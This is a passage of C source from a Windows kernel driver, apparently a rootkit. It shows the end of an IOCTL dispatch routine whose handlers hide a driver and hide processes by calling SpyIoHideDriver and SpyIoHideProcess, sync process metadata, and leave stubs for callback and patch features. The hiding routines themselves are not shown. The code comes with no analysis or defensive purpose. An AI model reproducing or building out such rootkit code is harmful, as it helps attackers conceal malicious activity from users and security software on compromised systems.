            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoHideDriver(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
	}

    case IOCTL_SPY_PHIDE:
    {
        DbgPrint("[*] IOCTL_SPY_PHIDE received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoHideProcess(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
    }

    case IOCTL_SPY_UPDATE:
    {
        DbgPrint("[*] IOCTL_SPY_UPDATE received\n");
        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
            DbgPrint("[-] Input buffer too small\n");
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }
        status = SpyIoSyncProcessMetadata(
            buffer,
            outBufferLength,
            &bytesReturned
        );
        break;
    }

    case IOCTL_SPY_CALLBACK:
        DbgPrint("[*] IOCTL_SPY_CALLBACK received\n");
        // TODO: Implement
        break;

    case IOCTL_SPY_PATCH:
        DbgPrint("[*] IOCTL_SPY_PATCH received\n");
        // TODO: Implement
        break;

    default:
        DbgPrint("[!] Unknown IOCTL: 0x%X\n", ioControlCode);
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

